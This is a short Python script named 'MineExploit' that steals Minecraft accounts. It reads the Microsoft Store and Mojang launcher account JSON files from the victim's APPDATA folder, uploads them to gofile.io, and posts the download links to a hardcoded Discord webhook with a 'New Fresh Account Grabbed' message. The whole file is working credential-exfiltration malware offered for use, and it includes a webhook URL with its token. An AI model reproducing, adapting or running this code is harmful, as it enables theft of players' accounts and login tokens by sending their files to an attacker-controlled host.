from requests import post , get
import os

webhook = "https://discord.com/api/webhooks/1043995253268566151/mZAVmQBdySZlwWk-zNLwNiRAfe-UfveeHa7uBie9sDLPRBaQDRGtlIPrEHWuaAafWoTd"

get_the_link_to_upload = get("https://api.gofile.io/getServer").json()
link = "https://" + get_the_link_to_upload['data']['server']+".gofile.io/uploadFile"

# Get Json Path

x = os.getenv('APPDATA')

Microsoft_Account = f"{x}\\.minecraft\\launcher_accounts_microsoft_store.json"
Mojang_Account = f"{x}\\.minecraft\\launcher_accounts.json"

with open(Microsoft_Account) as Microsoft_file :
    content = Microsoft_file.readlines()

with open(Mojang_Account) as Mojang_file :
    content1 = Mojang_file.readlines()

# Upload The Target Json file

y = post(url=link , files={'file' : open(Microsoft_Account , 'rb')}).json()
z = post(url=link , files={'file' : open(Mojang_Account , 'rb')}).json()

# Parse Download Page

Microsoft_Download_Page = y['data']['downloadPage']
Mojang_Download_Page = z['data']['downloadPage']

# Make the embed for the webhook

embeds = [
        {
            "title": "MineExploit",
            "description": "*```New Fresh Account Grabbed !!```*",
            "url": "https://github.com/matxd291",
            "color": 0x28282B,
            "fields": [
                {
                    "name": "Mojang JSON file",
                    "value": f"```{Mojang_Download_Page}```",
                    "inline": False
                },
                {
                    "name": "Microsoft JSON file",
                    "value": f"```{Microsoft_Download_Page}```",
                    "inline": False
                },


            ],
            "footer": {
                "text": "by matxd291",
                "icon_url": "https://iili.io/HHI2Tap.jpg"
            },

            "thumbnail": {
                "url": "https://images-ext-2.discordapp.net/external/q_EGBFoyr4mu73hwIdHsXYbR5dOXDB2EOWFAlIX3YRI/https/iili.io/HHzZbft.png"},

        }
    ]

payload = {"username": "MineExploit",
            "avatar_url": "https://iili.io/HHzZbft.png",
            "embeds": embeds}

# Post The results

post(webhook, json=payload)

# Program Finished !!